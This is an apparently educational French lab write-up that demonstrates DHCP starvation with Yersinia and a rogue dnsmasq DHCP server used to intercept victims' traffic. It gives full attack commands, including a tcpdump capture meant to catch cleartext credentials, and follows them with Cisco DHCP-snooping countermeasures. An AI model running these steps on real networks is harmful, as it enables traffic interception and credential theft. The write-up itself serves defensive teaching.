DHCP Starvation & Rogue DHCP Attaque MITM par empoisonnement réseau

Démonstration en environnement isolé d'une attaque DHCP en deux phases : saturation du pool d'adresses du serveur légitime (Starvation), puis déploiement d'un faux serveur DHCP (Rogue) pour intercepter le trafic réseau des victimes.

01 — Contexte & objectifs

Ce projet personnel a été réalisé dans un environnement de lab entièrement isolé (VirtualBox, réseau interne, aucune connexion internet). L'objectif est de comprendre en profondeur les vulnérabilités du protocole DHCP, de démontrer comment elles peuvent être exploitées, et d'identifier les contre-mesures à mettre en place côté infrastructure.

Cadre éthique : Cette démonstration est réalisée exclusivement sur un réseau virtuel isolé créé à cet effet. Ces techniques ne doivent jamais être utilisées sur un réseau sans autorisation explicite. Le but est pédagogique : comprendre pour mieux défendre.

03 — Phase 1 : DHCP Starvation

L'attaque par DHCP Starvation consiste à envoyer massivement des requêtes DHCP DISCOVER avec des adresses MAC aléatoires forgées. Le serveur DHCP légitime alloue une adresse IP à chacune de ces fausses requêtes jusqu'à épuiser totalement son pool d'adresses. Aucun nouveau client ne peut alors obtenir d'IP.

kali@lab — Phase 1 : saturation du pool DHCP
# Installation de Yersinia
sudo apt install -y yersinia

# Lancement de l'attaque DHCP Starvation
# -attack 1 = DHCP Discover flood avec MACs aléatoires
sudo yersinia dhcp -interface eth0 -attack 1

# Alternative avec dhcpstarv
sudo dhcpstarv -i eth0

# Vérification sur le serveur Windows — pool épuisé
# Commande PowerShell sur VM-Server :
Get-DhcpServerv4Lease -ScopeId 192.168.1.0 | Measure-Object
# → Count : 254 (pool entier alloué à de fausses MACs)

04 — Phase 2 : Rogue DHCP (MITM)

Une fois le pool légitime épuisé, on déploie un faux serveur DHCP sur la machine Kali. Il répond aux nouvelles requêtes DHCP des victimes en leur fournissant une adresse IP avec la machine attaquante comme passerelle par défaut. Tout le trafic de la victime transite alors par l'attaquant — c'est le Man-in-the-Middle.

kali@lab — Phase 2 : Rogue DHCP + interception
# Configurer le Rogue DHCP avec dnsmasq
# /etc/dnsmasq.conf :
interface=eth0
dhcp-range=192.168.1.150,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.5   # Gateway = attaquant
dhcp-option=6,8.8.8.8       # DNS public

sudo systemctl start dnsmasq

# Activer le forwarding IP (pour que la victime garde internet)
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Règle iptables pour forwarder le trafic
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Capturer le trafic intercepté avec tcpdump
sudo tcpdump -i eth0 -w mitm_capture.pcap

# Analyser dans Wireshark — credentials HTTP en clair
wireshark mitm_capture.pcap

05 — Contre-mesures & défenses

La protection contre ces attaques repose sur des fonctionnalités intégrées aux commutateurs managés Cisco.

Contre-mesure 1
DHCP Snooping

Fonction Cisco qui filtre les réponses DHCP. Seuls les ports trusted (connectés au vrai serveur DHCP) peuvent envoyer des OFFER/ACK. Tous les autres ports sont untrusted et bloquent les réponses DHCP.

Contre-mesure 2
Port Security · Rate Limiting

Limitation du nombre de trames par seconde sur chaque port pour bloquer le flood. La fonction ip dhcp snooping limit rate bloque automatiquement le port si le débit DHCP dépasse le seuil.

Contre-mesure 3
Dynamic ARP Inspection

Valide les paquets ARP en vérifiant la cohérence IP/MAC via la table DHCP Snooping. Empêche l'empoisonnement ARP complémentaire à l'attaque Rogue DHCP.

Contre-mesure 4
802.1X · Authentification réseau

Authentification de chaque équipement avant accès au réseau via RADIUS/NPS. Un équipement non authentifié (comme la Kali) ne peut pas se connecter et donc pas lancer l'attaque.

Cisco IOS — DHCP Snooping (contre-mesure)
! Activer DHCP Snooping globalement
ip dhcp snooping
ip dhcp snooping vlan 1-100

! Définir le port vers le serveur DHCP comme trusted
interface GigabitEthernet0/1
 ip dhcp snooping trust

! Limiter le débit DHCP sur les ports clients (10 paquets/s max)
interface GigabitEthernet0/2
 ip dhcp snooping limit rate 10

! Vérification
show ip dhcp snooping binding
show ip dhcp snooping statistics
